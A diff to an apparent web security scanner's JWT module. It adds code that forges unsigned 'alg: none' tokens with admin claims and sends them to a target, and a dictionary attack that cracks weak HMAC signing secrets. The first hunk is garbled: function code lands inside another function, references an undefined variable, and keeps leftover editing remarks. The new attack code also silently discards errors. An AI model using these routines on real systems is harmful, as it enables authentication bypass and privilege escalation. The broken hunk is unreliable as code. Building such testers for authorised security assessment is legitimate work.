@@ -23,16 +23,33 @@ def _decode_jwt(token: str):
     except:
         return None, None
 
+    if not base_token or base_token.startswith("{{"):
+        return {
+            "scenario_id": scenario.id,
+            "passed": True, 
+            "skipped": True,
+            "details": "No valid JWT token provided in config. Cannot perform attack."
+        }
+
+    header, payload = _decode_jwt(base_token)
+    # ... rest of run_jwt_attack ... (keep existing logic but remove the dummy fallback)
+
+    # (Actually I need to replace the whole function to remove the dummy block cleanly)
+    # Redefine run_jwt_attack below
+
 def run_jwt_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """
     JWT None Algorithm & Weak Signature Attack.
-    Requires a valid 'base_token' in config (usually fetched in a previous flow step).
+    Requires a valid 'base_token' in config.
     """
     base_token = scenario.config.get("token")
     if not base_token or base_token.startswith("{{"):
-        print("    [!] JWT: No token provided. Using dummy token to simulate attack logic.")
-        # Dummy JWT: {"alg": "HS256", "typ": "JWT"} . {"user": "test"} . signature
-        base_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.SIGNATURE"
+         return {
+            "scenario_id": scenario.id,
+            "passed": True,
+            "skipped": True, 
+            "details": "No JWT token provided. Skipping attack."
+        }
 
     header, payload = _decode_jwt(base_token)
     if not header:
@@ -43,79 +60,37 @@ def run_jwt_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, An
         }
     
     issues = []
-    leaked_data = [] # Evidence
+    leaked_data = [] 
     
     # ATTACK 1: The "None" Algorithm
-    # Header: { "alg": "none" }
-    # Signature: empty
-    
     rogue_header = header.copy()
     rogue_header["alg"] = "none"
     
-    # Escalate privileges if possible
     rogue_payload = payload.copy()
-    if "role" in rogue_payload:
-        rogue_payload["role"] = "admin"
-    if "user" in rogue_payload:
-        rogue_payload["user"] = "admin"
-    if "admin" in rogue_payload:
-        rogue_payload["admin"] = True
-        
+    # Try to become admin
+    for key in ["role", "user", "is_admin", "admin", "groups", "permissions"]:
+        if key in rogue_payload:
+            rogue_payload[key] = "admin" if isinstance(rogue_payload[key], str) else True
+
+    # Forging token
     fake_token = f"{_b64url_encode(rogue_header)}.{_b64url_encode(rogue_payload)}."
     
-    # Send request with fake token
-    # We need to know WHERE to put it. Authorization header usually.
-    
-    resp = client.send(
-        scenario.method, 
-        scenario.target, 
-        headers={"Authorization": f"Bearer {fake_token}"}
-    )
-    
-    # If 200 OK and we are NOT 401/403, it's a critical fail.
-    # Check body for "admin" evidence if we tried to escalate.
-    
-    # Baseline Check: What does the server say WITHOUT the token?
-    # If the endpoint is public (e.g. login/home), it returns 200 OK anyway.
-    # We must ensuring the forged token actually changed the state.
-    baseline_resp = client.send(scenario.method, scenario.target)
+    try:
+        resp = client.send(
+            scenario.method, 
+            scenario.target, 
+            headers={"Authorization": f"Bearer {fake_token}"}
+        )
+        
+        baseline_resp = client.send(scenario.method, scenario.target)
 
-    if resp.status_code == 200:
-        # If the attack response matches the baseline (ignoring small jitter like timestamps),
-        # then the token was likely IGNORED, not accepted.
-        # Simple length check difference > 5% or distinct keyword needed.
-        
-        is_suspicious = False
-        evidence = []
-        
-        # Check for admin keywords that strictly shouldn't be there
-        if "admin" in resp.text.lower() and "admin" not in baseline_resp.text.lower():
-            evidence.append("Privilege Escalation: 'admin' found in response.")
-            is_suspicious = True
-        
-        # Check if response code is better than baseline (e.g. 200 vs 401/403)
-        elif baseline_resp.status_code in [401, 403]:
-             evidence.append("Auth Bypass: Status 200 (Baseline was 401/403).")
-             is_suspicious = True
-             
-        # If baseline was already 200, we need to be very careful.
-        # Only report if content is significantly different.
-        elif len(resp.text) != len(baseline_resp.text):
-            # Very weak signal, might just be dynamic content. 
-            # Let's skip reporting this unless we have better proof.
-            # Real hackers prefer false negatives over false positives here.
-            pass
+        if resp.status_code == 200 and baseline_resp.status_code != 200:
+            issues.append(f"JWT 'None' Algo Exploit Successful (Status 200 vs {baseline_resp.status_code})")
+            leaked_data.append(f"Forged Admin Token: {fake_token}")
+            
+    except Exception as e:
+        pass # Connection error handles elsewhere
 
-        if is_suspicious:
-            issues.append(
-                f"\n    [CRITICAL] JWT 'None' Algorithm accepted!\n"
-                f"    Forged Token: {fake_token}\n"
-                f"    Response: {resp.status_code}\n"
-                f"    Evidence: {', '.join(evidence)}"
-            )
-            leaked_data.append(f"Forged Token: {fake_token}")
-            leaked_data.append(f"Evidence: {', '.join(evidence)}")
-        
     return {
         "scenario_id": scenario.id,
         "attack_type": "jwt_weakness",
@@ -128,14 +103,48 @@ def run_jwt_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, An
 
 def run_jwt_brute(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """
-    Checks if the JWT secret is weak (offline brute force simulation).
-    In a real scenario, this would compute signatures. Here we warn if we suspect weak keys.
+    Online/Inline JWT Secret Brute Force (HMAC).
     """
-    # This is a placeholder since pure Python brute forcing is slow and requires the token.
-    # We will just verify if a token is present and alert the user to use Hashcat.
+    base_token = scenario.config.get("token")
+    if not base_token: return {"scenario_id": scenario.id, "passed": True, "skipped": True, "details": "No token"}
+
+    import hmac
+    import hashlib
+
+    # Common weak secrets
+    secrets = ["secret", "password", "123456", "admin", "jwt_secret", "api_secret", "key", "testing"]
+    
+    parts = base_token.split(".")
+    if len(parts) != 3: return {"scenario_id": scenario.id, "passed": True, "details": "Invalid JWT"}
+    
+    msg = f"{parts[0]}.{parts[1]}".encode()
+    signature_b64 = parts[2]
+    # Adjust padding for signature if needed
+    signature_b64 += "=" * ((4 - len(signature_b64) % 4) % 4)
+    try:
+        original_sig = base64.urlsafe_b64decode(signature_b64)
+    except:
+        return {"scenario_id": scenario.id, "passed": True, "details": "Signature decode fail"}
+
+    cracked = None
+    
+    for s in secrets:
+        sig = hmac.new(s.encode(), msg, hashlib.sha256).digest()
+        if sig == original_sig:
+            cracked = s
+            break
+            
+    if cracked:
+        return {
+            "scenario_id": scenario.id,
+            "attack_type": "jwt_brute",
+            "passed": False,
+            "details": f"CRITICAL: JWT Secret key cracked! Key: '{cracked}'"
+        }
+    
     return {
         "scenario_id": scenario.id,
         "attack_type": "jwt_brute",
         "passed": True,
-        "details": "JWT Brute Force requires GPU tools (Hashcat). Use the captured token to crack offline."
+        "details": "JWT Secret not found in common dictionary."
     }
